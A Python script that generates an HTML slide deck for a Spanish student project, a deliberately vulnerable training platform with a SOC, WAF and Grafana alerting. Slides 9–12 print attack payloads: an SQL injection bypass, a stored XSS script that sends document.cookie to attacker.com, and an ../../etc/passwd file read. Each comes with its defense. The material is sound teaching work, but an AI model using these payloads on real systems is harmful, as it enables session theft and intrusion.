# -*- coding: utf-8 -*-
slides = [
    {"num": "01", "title": "Sofia Solutions", "subtitle": "Plataforma de Seguridad y Monitorización SOC", "body": "", "type": "cover"},
    {"num": "02", "title": "Índice", "type": "index", "items": ["Motivación y Contexto","Objetivos del Proyecto","Arquitectura del Sistema","Stack Tecnológico","Modos de Operación","Consola de Auditoría – Ataques","Demostración: SQL Injection","Demostración: Fuerza Bruta","Demostración: XSS / Cookie Hijacking","Demostración: LFI / IDOR / DoS","Defensa: WAF Shield","Monitorización SOC – Grafana","Automatización: n8n","Infraestructura Docker","Resultados y Métricas","Conclusiones y Aprendizajes","Demo en Vivo – Q&A"]},
    {"num": "03", "title": "Motivación", "type": "two_col", "left": ["Las empresas sufren miles de ciberataques diarios","La mayoría de plataformas no ofrecen transparencia sobre sus vulnerabilidades","La formación en seguridad requiere entornos reales, no solo teoría"], "right": ["Este proyecto nació de la necesidad de crear un entorno real de prácticas de ciberseguridad ofensiva y defensiva","Combinando experiencia del ciclo ASIR con prácticas en empresa"]},
    {"num": "04", "title": "Objetivos del Proyecto", "type": "bullets", "items": ["✦  Construir una plataforma empresarial multi-tenant completa y funcional","✦  Demostrar vulnerabilidades reales (OWASP Top 10) en un entorno controlado","✦  Implementar contramedidas de seguridad y un sistema SOC real","✦  Integrar telemetría en tiempo real con Grafana y alertas automatizadas con n8n","✦  Desplegar todo en Docker con acceso público mediante tunneling SSL"]},
    {"num": "05", "title": "Arquitectura del Sistema", "type": "arch", "components": [("Frontend PHP 8.2","Apache :8000","Proxy inverso + vistas"),("Backend Node.js v20","Express + Prisma","API REST segura"),("PostgreSQL 15","Base de Datos","Datos y eventos SOC"),("Prometheus + Grafana","Observabilidad","Métricas en tiempo real"),("n8n Workflows","Automatización","Alertas por email"),("Serveo SSL","Túnel de Red","Acceso público HTTPS")]},
    {"num": "06", "title": "Stack Tecnológico", "type": "tech", "items": [("Frontend","PHP 8.2 · Apache · HTML5 · CSS3 · JS"),("Backend","Node.js v20 · Express · Prisma ORM · TypeScript"),("Base de Datos","PostgreSQL 15 · Esquema multi-tenant"),("Seguridad","Bcrypt · JWT · Helmet · Rate Limiting · WAF propio"),("Observabilidad","Prometheus · Grafana · cAdvisor"),("Automatización","n8n · Webhooks · SMTP Gmail"),("Infraestructura","Docker · Docker Compose · Serveo SSL")]},
    {"num": "07", "title": "Modos de Operación", "type": "two_col_color", "left_title": "🔴 MODO VULNERABLE", "left_color": "#ff4444", "left_items": ["Sin Rate Limiting en login","Contraseñas en MD5 sin sal","Tokens JWT sin expiración","Consultas SQL sin parametrizar","Sin validación de inputs","LFI y IDOR sin control de acceso"], "right_title": "🟢 MODO SEGURO", "right_color": "#00ff88", "right_items": ["Rate Limiting: 5 intentos máx.","Bcrypt 12 rondas","JWT con expiración estricta","Prepared Statements + Prisma","Validación Zod en todos los inputs","Control de acceso por propietario"]},
    {"num": "08", "title": "Consola de Auditoría", "type": "bullets", "items": ["Herramienta integrada en la plataforma para demostrar ataques en tiempo real","Accesible en /consola — solo visible en modo vulnerable","6 vectores de ataque implementados: SQLi · Brute Force · XSS · LFI · IDOR · DoS","Cada ataque muestra evidencias reales: datos exfiltrados, tokens, archivos del sistema","Las acciones generan eventos en el SOC y alertas en Grafana automáticamente","El WAF bloquea los mismos ataques al cambiar a modo seguro"]},
    {"num": "09", "title": "Demo: SQL Injection", "type": "code_slide", "description": "Payload clásico de bypass de autenticación. En modo vulnerable, la consulta no está parametrizada.", "code": "Payload:  ' OR '1'='1' --\n\nConsulta generada:\nSELECT * FROM users\nWHERE email = '' OR '1'='1' --'\nAND password = '...'\n\nResultado: ACCESO CONCEDIDO\nDatos exfiltrados: IBAN · Tarjetas · Tokens JWT", "defense": "DEFENSA: Prisma ORM genera Prepared Statements. El payload se trata como string literal, nunca como SQL."},
    {"num": "10", "title": "Demo: Fuerza Bruta", "type": "code_slide", "description": "Ataque de diccionario contra el endpoint de login. Sin Rate Limiting, se pueden hacer intentos ilimitados.", "code": "Diccionario probado:\n123456 → FALLO\npassword → FALLO\nadmin → FALLO\niber2024 → FALLO\niber123 → FALLO\niberdrola123 → ÉXITO ✓\n\nTiempo: 6 intentos / 2.3s", "defense": "DEFENSA: Rate Limiter corta la conexión tras 5 intentos. IP bloqueada 15 minutos. Alerta CRÍTICA enviada al SOC."},
    {"num": "11", "title": "Demo: XSS + Cookie Hijacking", "type": "code_slide", "description": "Script malicioso inyectado en un campo de ticket de soporte. El servidor lo almacena y ejecuta en el navegador de la víctima.", "code": "Payload XSS:\n<script>\n  fetch('https://attacker.com/steal?c='\n    + document.cookie);\n</script>\n\nCookie capturada:\naccessToken=eyJhbGciOiJIUzI1...\n\nEscalada: Rol modificado a ADMIN", "defense": "DEFENSA: Helmet CSP bloquea scripts externos. Cookies marcadas HttpOnly — inaccesibles desde JS."},
    {"num": "12", "title": "Demo: LFI · IDOR · DoS", "type": "three_col", "cols": [("LFI — Local File Inclusion","Payload: ../../etc/passwd","Expone archivos del servidor","DEFENSA: Validación de rutas, lista blanca de archivos permitidos"),("IDOR — Acceso Directo a Objetos","GET /api/tickets/42 (sin ser dueño)","Acceso a datos de otro usuario","DEFENSA: Verificación de propiedad: ticket.userId === req.user.id"),("DoS — Denegación de Servicio","1000 peticiones simultáneas en 5s","Saturación del servidor","DEFENSA: Rate Limiting global + Nginx throttling")]},
    {"num": "13", "title": "WAF Shield — Escudo Defensivo", "type": "bullets", "items": ["Middleware propio que intercepta TODAS las peticiones antes de llegar a la API","Analiza body, query params y path usando expresiones regulares de patrones maliciosos","Detecta: SQLi · XSS · Path Traversal · Command Injection","En modo vulnerable: registra el ataque y permite continuar (para la demo)","En modo seguro: bloquea con HTTP 403 + alerta inmediata al SOC","Cada bloqueo incrementa las métricas de Prometheus para Grafana"]},
    {"num": "14", "title": "Monitorización SOC — Grafana", "type": "bullets", "items": ["Dashboard en tiempo real con 6+ paneles de telemetría","Mapa geográfico: ubicación simulada de los atacantes (US, CN, RU, BR...)",  "Gráfica de ataques por hora con picos detectables en las demos","Distribución de tipos de ataque: SQLi 35% · Fuerza Bruta 25% · XSS 20% · Otros","Panel de sesiones activas e incidentes abiertos","Métricas HTTP: latencia, errores 4xx/5xx, throughput total"]},
    {"num": "15", "title": "Automatización: n8n", "type": "two_col", "left": ["Cada ataque CRÍTICO o ALTA dispara un webhook hacia n8n","n8n procesa la alerta y envía un email al SOC (ewsophie333@gmail.com)","El email incluye: tipo de ataque, IP de origen, endpoint afectado, timestamp","El pipeline completo tarda menos de 2 segundos desde el ataque hasta el email"], "right": ["Flujo n8n:","① Webhook Trigger (POST /webhook/alert)","② Procesar Alerta (format data)","③ Filtro por Severidad (CRÍTICA/ALTA)","④ Enviar Email Gmail (SMTP)","⑤ Log de confirmación"]},
    {"num": "16", "title": "Infraestructura Docker", "type": "tech", "items": [("sofia-frontend","PHP 8.2 + Apache · Puerto 8000"),("sofia-backend","Node.js 20 · Puerto 3001"),("sofia-db","PostgreSQL 15 · Puerto 5432"),("grafana","Grafana OSS · Puerto 3000"),("prometheus","Prometheus · Puerto 9090"),("n8n","n8n · Puerto 5678"),("cadvisor","Métricas de contenedores")]},
    {"num": "17", "title": "Resultados y Métricas", "type": "metrics", "items": [("7","Contenedores Docker en producción"),("6","Vectores de ataque implementados"),("100%","Ataques bloqueados en modo seguro"),("< 2s","Latencia de alerta email SOC"),("147","Eventos de seguridad registrados en demo"),("12","Rondas de Bcrypt para hashing de contraseñas")]},
    {"num": "18", "title": "Conclusiones y Aprendizajes", "type": "bullets", "items": ["He construido una plataforma de seguridad completa, desde la base de datos hasta el frontend","Aprendí que la seguridad no es un módulo adicional — es un proceso que atraviesa toda la arquitectura","La mayor lección: las mismas herramientas que permiten vulnerar un sistema son las que ayudan a defenderlo","El proyecto me ha dado experiencia práctica en DevSecOps, containerización y respuesta a incidentes","Cada línea de código tiene una razón de seguridad detrás"]},
    {"num": "19", "title": "¿Por qué Sofia Solutions?", "type": "two_col", "left": ["Plataforma real, no un ejercicio académico","Multi-tenant con clientes reales (Iberdrola, Mercadona, Endesa)","Dos modos de operación para demostrar ataque Y defensa en vivo","Infraestructura de producción en la nube (Codespaces + Serveo)","Código completo, comentado y publicado en GitHub"], "right": ["Lo que lo diferencia de otros Proyectos:","— Sistema SOC real con Grafana","— Alertas de seguridad en tiempo real","— Consola de auditoría interactiva","— WAF propio desarrollado desde cero","— Pipeline CI/CD con Docker Compose"]},
    {"num": "20", "title": "Demo en Vivo", "subtitle": "¿Preguntas?", "type": "final", "links": [("Plataforma","https://sofia-solutions.serveousercontent.com"),("Consola","https://sofia-solutions.serveousercontent.com/consola"),("Panel SOC","https://sofia-solutions.serveousercontent.com/admin"),("Grafana","https://sofia-solutions.serveousercontent.com/grafana/"),("GitHub","https://github.com/ewsophie333-lgtm/sofia-solutions")]},
]

CSS = """
* { margin: 0; padding: 0; box-sizing: border-box; }
:root { --bg: #070d1a; --bg2: #0d1525; --green: #00ff88; --cyan: #00d4ff; --red: #ff4444; --text: #e0e6f0; --muted: #6b7a99; --border: rgba(0,255,136,0.15); }
html { scroll-snap-type: y mandatory; overflow-y: scroll; scroll-behavior: smooth; }
body { background: var(--bg); color: var(--text); font-family: 'Inter', 'Segoe UI', sans-serif; }
.slide { width: 100vw; min-height: 100vh; scroll-snap-align: start; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 60px 80px; position: relative; border-bottom: 1px solid var(--border); }
.slide-num { position: absolute; top: 30px; right: 40px; font-size: 12px; color: var(--muted); letter-spacing: 3px; }
.slide-line { width: 60px; height: 3px; background: linear-gradient(90deg, var(--green), var(--cyan)); border-radius: 2px; margin-bottom: 28px; }
h1.main { font-size: clamp(36px,5vw,64px); font-weight: 800; background: linear-gradient(135deg, var(--green), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; line-height: 1.1; }
h2.title { font-size: clamp(28px,3.5vw,48px); font-weight: 700; color: var(--green); margin-bottom: 12px; }
.subtitle { font-size: 20px; color: var(--muted); text-align: center; margin-top: 16px; }
.bullets { list-style: none; max-width: 800px; width: 100%; }
.bullets li { padding: 14px 20px; margin-bottom: 10px; background: var(--bg2); border-left: 3px solid var(--green); border-radius: 0 8px 8px 0; font-size: 16px; line-height: 1.5; }
.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; max-width: 1100px; width: 100%; margin-top: 30px; }
.col-box { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; padding: 30px; }
.col-box h3 { margin-bottom: 16px; font-size: 18px; }
.col-box ul { list-style: none; }
.col-box li { padding: 8px 0; color: var(--text); font-size: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); }
.col-box li:last-child { border: none; }
.code-box { background: #0a1628; border: 1px solid rgba(0,255,136,0.2); border-radius: 12px; padding: 24px; font-family: 'Courier New', monospace; font-size: 14px; color: var(--green); white-space: pre; line-height: 1.7; max-width: 800px; width: 100%; margin: 20px 0; }
.defense-box { background: rgba(0,255,136,0.05); border: 1px solid var(--green); border-radius: 8px; padding: 16px 20px; font-size: 14px; color: var(--green); max-width: 800px; width: 100%; }
.tech-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; max-width: 1100px; width: 100%; margin-top: 20px; }
.tech-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 20px; }
.tech-card .label { font-size: 11px; color: var(--cyan); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; }
.tech-card .value { font-size: 15px; color: var(--text); }
.arch-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; max-width: 1100px; width: 100%; margin-top: 20px; }
.arch-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; padding: 24px; text-align: center; }
.arch-card .ac-title { font-size: 14px; font-weight: 700; color: var(--green); margin-bottom: 6px; }
.arch-card .ac-sub { font-size: 12px; color: var(--cyan); margin-bottom: 10px; }
.arch-card .ac-desc { font-size: 13px; color: var(--muted); }
.metrics-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; max-width: 900px; width: 100%; margin-top: 24px; }
.metric-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; padding: 28px 20px; text-align: center; }
.metric-card .big { font-size: 48px; font-weight: 800; color: var(--green); line-height: 1; }
.metric-card .desc { font-size: 13px; color: var(--muted); margin-top: 10px; }
.index-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; max-width: 900px; width: 100%; margin-top: 20px; counter-reset: idx; }
.index-item { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 14px 20px; font-size: 15px; color: var(--text); display: flex; align-items: center; gap: 14px; counter-increment: idx; }
.index-item::before { content: counter(idx, decimal-leading-zero); color: var(--green); font-size: 13px; font-weight: 700; min-width: 28px; }
.three-col { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; max-width: 1100px; width: 100%; margin-top: 20px; }
.three-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; padding: 24px; }
.three-card h3 { font-size: 15px; color: var(--cyan); margin-bottom: 14px; }
.three-card p { font-size: 14px; color: var(--text); margin-bottom: 8px; }
.three-card .defense { font-size: 13px; color: var(--green); border-top: 1px solid var(--border); margin-top: 12px; padding-top: 12px; }
.final-links { display: flex; flex-wrap: wrap; gap: 16px; margin-top: 30px; justify-content: center; }
.final-links a { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 14px 24px; color: var(--green); text-decoration: none; font-size: 15px; transition: all 0.2s; }
.final-links a:hover { border-color: var(--green); background: rgba(0,255,136,0.08); }
.nav { position: fixed; bottom: 30px; right: 30px; display: flex; gap: 10px; z-index: 100; }
.nav button { background: var(--bg2); border: 1px solid var(--border); color: var(--green); width: 40px; height: 40px; border-radius: 50%; cursor: pointer; font-size: 18px; transition: all 0.2s; }
.nav button:hover { background: rgba(0,255,136,0.1); border-color: var(--green); }
.progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, var(--green), var(--cyan)); z-index: 200; transition: width 0.1s; }
.tag-vuln { background: rgba(255,68,68,0.15); color: var(--red); border: 1px solid var(--red); padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; letter-spacing: 1px; display: inline-block; margin-bottom: 12px; }
.tag-secure { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid var(--green); padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; letter-spacing: 1px; display: inline-block; margin-bottom: 12px; }
.author { position: absolute; bottom: 30px; left: 40px; font-size: 13px; color: var(--muted); }
"""

def render_slide(s):
    num = s['num']
    t = s['type']
    out = f'<div class="slide" id="slide-{num}">'
    out += f'<span class="slide-num">{num} / 20</span>'
    out += '<div class="slide-line"></div>'
    out += f'<span class="author">Sofia Gomez · ASIR 2026</span>'

    if t == 'cover':
        out += f'<h1 class="main">🛡️ {s["title"]}</h1>'
        out += f'<p class="subtitle">{s["subtitle"]}</p>'
    elif t == 'index':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<div class="index-grid">'
        for item in s['items']:
            out += f'<div class="index-item">{item}</div>'
        out += '</div>'
    elif t == 'bullets':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<ul class="bullets">'
        for item in s['items']:
            out += f'<li>{item}</li>'
        out += '</ul>'
    elif t == 'two_col':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<div class="two-col">'
        out += '<div class="col-box"><ul>'
        for li in s['left']:
            out += f'<li>{li}</li>'
        out += '</ul></div>'
        out += '<div class="col-box"><ul>'
        for li in s['right']:
            out += f'<li>{li}</li>'
        out += '</ul></div>'
        out += '</div>'
    elif t == 'two_col_color':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<div class="two-col">'
        out += f'<div class="col-box" style="border-color:{s["left_color"]}33">'
        out += f'<h3 style="color:{s["left_color"]}">{s["left_title"]}</h3><ul>'
        for li in s['left_items']:
            out += f'<li>{li}</li>'
        out += '</ul></div>'
        out += f'<div class="col-box" style="border-color:{s["right_color"]}33">'
        out += f'<h3 style="color:{s["right_color"]}">{s["right_title"]}</h3><ul>'
        for li in s['right_items']:
            out += f'<li>{li}</li>'
        out += '</ul></div>'
        out += '</div>'
    elif t == 'arch':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<div class="arch-grid">'
        for (title, sub, desc) in s['components']:
            out += f'<div class="arch-card"><div class="ac-title">{title}</div><div class="ac-sub">{sub}</div><div class="ac-desc">{desc}</div></div>'
        out += '</div>'
    elif t == 'tech':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<div class="tech-grid">'
        for (label, val) in s['items']:
            out += f'<div class="tech-card"><div class="label">{label}</div><div class="value">{val}</div></div>'
        out += '</div>'
    elif t == 'code_slide':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += f'<p style="margin-bottom:16px;color:var(--muted);max-width:800px;text-align:center">{s["description"]}</p>'
        out += f'<div class="code-box">{s["code"]}</div>'
        out += f'<div class="defense-box">🛡️ {s["defense"]}</div>'
    elif t == 'three_col':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<div class="three-col">'
        for (title, payload, effect, defense) in s['cols']:
            out += f'<div class="three-card"><h3>{title}</h3><p><strong>Payload:</strong> {payload}</p><p><strong>Efecto:</strong> {effect}</p><div class="defense">🛡️ {defense}</div></div>'
        out += '</div>'
    elif t == 'metrics':
        out += f'<h2 class="title">{s["title"]}</h2>'
        out += '<div class="metrics-grid">'
        for (val, desc) in s['items']:
            out += f'<div class="metric-card"><div class="big">{val}</div><div class="desc">{desc}</div></div>'
        out += '</div>'
    elif t == 'final':
        out += f'<h1 class="main">{s["title"]}</h1>'
        out += f'<p class="subtitle">{s["subtitle"]}</p>'
        out += '<div class="final-links">'
        for (label, url) in s['links']:
            out += f'<a href="{url}" target="_blank">{label} ↗</a>'
        out += '</div>'

    out += '</div>'
    return out

html = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sofia Solutions – Proyecto Final ASIR 2026</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>{CSS}</style>
</head>
<body>
<div class="progress" id="progress"></div>
{''.join(render_slide(s) for s in slides)}
<nav class="nav">
  <button onclick="prevSlide()">↑</button>
  <button onclick="nextSlide()">↓</button>
</nav>
<script>
let current = 0;
const total = 20;
const slides = document.querySelectorAll('.slide');
function goTo(n) {{
  current = Math.max(0, Math.min(total - 1, n));
  slides[current].scrollIntoView({{behavior:'smooth'}});
  document.getElementById('progress').style.width = ((current+1)/total*100)+'%';
}}
function nextSlide() {{ goTo(current + 1); }}
function prevSlide() {{ goTo(current - 1); }}
document.addEventListener('keydown', e => {{
  if (e.key === 'ArrowDown' || e.key === 'PageDown') nextSlide();
  if (e.key === 'ArrowUp' || e.key === 'PageUp') prevSlide();
}});
const observer = new IntersectionObserver(entries => {{
  entries.forEach(e => {{ if (e.isIntersecting) current = [...slides].indexOf(e.target); }});
}}, {{threshold: 0.5}});
slides.forEach(s => observer.observe(s));
document.getElementById('progress').style.width = '5%';
</script>
</body>
</html>"""

with open('DEFENSA_SOFIA.html', 'w', encoding='utf-8') as f:
    f.write(html)
print('Presentacion generada: DEFENSA_SOFIA.html')
